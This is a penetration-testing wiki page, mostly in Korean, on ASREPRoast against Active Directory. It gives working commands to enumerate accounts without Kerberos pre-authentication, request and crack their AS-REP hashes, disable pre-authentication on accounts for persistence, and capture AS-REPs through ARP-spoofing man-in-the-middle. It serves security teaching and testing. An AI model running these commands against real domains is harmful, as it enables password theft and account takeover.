# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast는 **Kerberos 사전 인증 필수 속성**이 없는 사용자를 악용하는 보안 공격입니다. 본질적으로 이 취약점은 공격자가 사용자의 비밀번호 없이 도메인 컨트롤러(DC)에서 사용자의 인증을 요청할 수 있게 합니다. 그러면 DC는 사용자의 비밀번호에서 파생된 키로 암호화된 메시지로 응답하며, 공격자는 이를 오프라인에서 크랙하여 사용자의 비밀번호를 알아내려고 시도할 수 있습니다.

이 공격의 주요 요구 사항은 다음과 같습니다:

* **Kerberos 사전 인증 부족**: 대상 사용자는 이 보안 기능이 활성화되어 있지 않아야 합니다.
* **도메인 컨트롤러(DC)와의 연결**: 공격자는 요청을 보내고 암호화된 메시지를 받기 위해 DC에 접근해야 합니다.
* **선택적 도메인 계정**: 도메인 계정을 보유하면 공격자가 LDAP 쿼리를 통해 취약한 사용자를 더 효율적으로 식별할 수 있습니다. 이러한 계정이 없으면 공격자는 사용자 이름을 추측해야 합니다.

#### 취약한 사용자 열거하기 (도메인 자격 증명 필요)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="리눅스 사용" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS\_REP 메시지 요청

{% code title="리눅스 사용" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Windows 사용하기" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
Rubeus를 사용한 AS-REP Roasting은 0x17의 암호화 유형과 0의 사전 인증 유형을 가진 4768을 생성합니다.
{% endhint %}

### 크래킹
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### 지속성

사용자에게 **GenericAll** 권한(또는 속성 쓰기 권한)이 있는 경우 **preauth**가 필요하지 않도록 강제합니다:

{% code title="Using Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="리눅스 사용하기" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## 자격 증명 없이 ASREProast

공격자는 중간자 위치를 사용하여 AS-REP 패킷을 캡처할 수 있으며, 이는 Kerberos 사전 인증이 비활성화되지 않은 상태에서도 네트워크를 통과합니다. 따라서 VLAN의 모든 사용자에게 작동합니다.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) 를 사용하면 이를 수행할 수 있습니다. 또한, 이 도구는 Kerberos 협상을 변경하여 클라이언트 워크스테이션이 RC4를 사용하도록 강제합니다.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## References

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

경험이 풍부한 해커 및 버그 바운티 헌터와 소통하기 위해 [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) 서버에 참여하세요!

**해킹 통찰력**\
해킹의 스릴과 도전에 대해 깊이 있는 콘텐츠에 참여하세요.

**실시간 해킹 뉴스**\
실시간 뉴스와 통찰력을 통해 빠르게 변화하는 해킹 세계를 최신 상태로 유지하세요.

**최신 공지사항**\
새로운 버그 바운티 출시 및 중요한 플랫폼 업데이트에 대한 정보를 유지하세요.

오늘 [**Discord**](https://discord.com/invite/N3FrSbmwdy)에 참여하여 최고의 해커들과 협업을 시작하세요!

{% hint style="success" %}
AWS 해킹 배우기 및 연습하기:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP 해킹 배우기 및 연습하기: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks 지원하기</summary>

* [**구독 계획**](https://github.com/sponsors/carlospolop) 확인하기!
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 참여하거나 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**를 팔로우하세요.**
* [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) 깃허브 리포지토리에 PR을 제출하여 해킹 트릭을 공유하세요.

</details>
{% endhint %}
